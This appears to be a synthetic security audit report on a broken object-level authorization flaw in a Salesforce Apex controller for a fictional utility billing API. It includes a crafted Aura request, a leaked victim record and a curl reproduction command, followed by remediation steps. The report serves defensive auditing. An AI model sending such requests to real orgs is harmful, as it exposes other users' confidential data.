# Security Analysis Report
**System:** PowerGrid Customer Billing API (Salesforce-Integrated)
**Domain:** Energy / Utilities / Smart Grid
**Example ID:** SF-0114
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `EventController.updateEvent` — attacker reads any billing Event record with all sensitive fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Event Object (Pattern 1.12)

### Summary
The Apex controller `EventController` on PowerGrid Customer Billing API (`4a082129.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 1.12, the client-supplied `fields` array enables mass field assignment — the attacker requests all sensitive fields for Event `0012129` owned by another user.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getEventDetails(String eventId, ...)` while the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict (read vs. update). The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://4a082129.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://4a082129.lightning.force.com/aura
Authorization: Bearer 00D4A082129!AR4a082129...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D4A082129!AR4a082129...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"0012129","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0012129", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-20-6207"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D4A082129!AR4a082129..."
curl -s -X POST "https://4a082129.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0012129","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-20-6207
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. `updateEvent` must perform write operations only — field selection parameter should not enable read pivots.
